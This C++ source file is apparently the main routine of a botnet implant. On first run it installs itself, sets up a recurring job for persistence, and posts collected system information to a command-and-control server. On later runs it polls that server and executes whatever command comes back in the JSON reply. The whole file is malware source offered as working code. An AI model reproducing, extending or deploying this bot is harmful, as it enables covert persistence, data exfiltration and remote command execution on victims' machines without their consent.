#include <stdio.h>
#include <experimental/filesystem>
#include <fstream>
#include <string>

#include "authfile.hh"
#include "bot.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;

int main() {
    // Set URLs for C2 servers
    std::string register_url = C2_SERVER + REGISTER_URI;
    std::string command_url = C2_SERVER + CMD_URI;

    // Check if an auth file has been initialized
    fs::path install_dir = util::GetInstallDir();
    AuthFile auth(install_dir / AUTH_FILE);

    if (!auth.Exists()) {
        auth.Init();

        Installer install(install_dir);
        install.InstallFile(BIN, BIN_NEW);
        install.InitRecurringJob();

        // Create POST form from DataList and register C2 server
        sysinfo::DataList sysinfo(auth.GetHash());
        std::string data = sysinfo.GetPostData();
        request::Post(register_url, data);
    } else {
        auth.Retrieve();

        // Create POST form from DataList and get command from C2 server
        sysinfo::DataList sysinfo(auth.GetHash());
        std::string data = sysinfo.GetPostData();
        std::string cmd_response = request::Post(command_url, data);

        // Parse JSON response from C2 server and execute command
        Command cmd(cmd_response);
        cmd.Execute();
    }

    return 0;
}
